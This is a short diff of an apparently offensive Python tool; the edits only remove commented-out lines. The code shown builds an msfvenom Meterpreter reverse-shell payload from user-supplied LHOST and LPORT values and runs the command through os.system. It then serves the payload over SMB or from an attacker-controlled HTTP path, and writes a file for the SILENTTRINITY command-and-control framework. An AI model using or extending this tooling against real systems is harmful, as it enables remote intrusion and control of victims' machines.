@@ -71,7 +71,6 @@ def createPayload(password):
 	lport = raw_input("Select LPORT: ")
 
 	#msfvenom creation
-	#subprocess.call(["msfvenom", "-p", payload, "LHOST=" + lhost, "LPORT=" + lport, "-f", "raw", ">", "meter"])
 	command = "msfvenom -p " + payload + " LHOST=" + lhost + " LPORT=" + lport + " -f raw > meter"
 	print("[*] Generating payload " + command)
 	os.system(command)
@@ -143,8 +142,6 @@ def main():
 
 	if function == "8": #Meterpreter
 		lhost,lport = createPayload(password)
-		#lhost = "a"
-		#lhost = "b"
 		print("How do you want to serve your payload? ")
 		mode = setServingMode()
 		if mode == "1": #SMB
@@ -169,9 +166,6 @@ def main():
 		else:
 			path = "http://" + lhost + "/elmal.txt"
 		writeFile(password,path,"silenttrinity",url)
-		
-	#elif function == "4": #Reverse ICMP
-	#elif function == "5": #Reverse DNS
 	else:
 		print("Enter your IP: ")
 		lhost = raw_input()
